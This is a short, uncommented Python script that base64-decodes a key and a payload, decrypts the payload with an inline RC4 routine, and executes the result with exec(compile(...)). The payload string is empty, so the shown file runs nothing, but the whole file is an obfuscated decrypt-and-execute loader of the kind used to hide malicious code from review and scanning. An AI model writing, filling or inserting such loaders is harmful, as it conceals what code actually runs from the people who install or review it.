import base64
_key = base64.b64decode('lNlwrr8+jXCK4cHQ9Edcog==')
_data = base64.b64decode('')
def _rc4(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    return bytes(result)
_decrypted = _rc4(_data, _key)
exec(compile(_decrypted.decode(), '<string>', 'exec'))
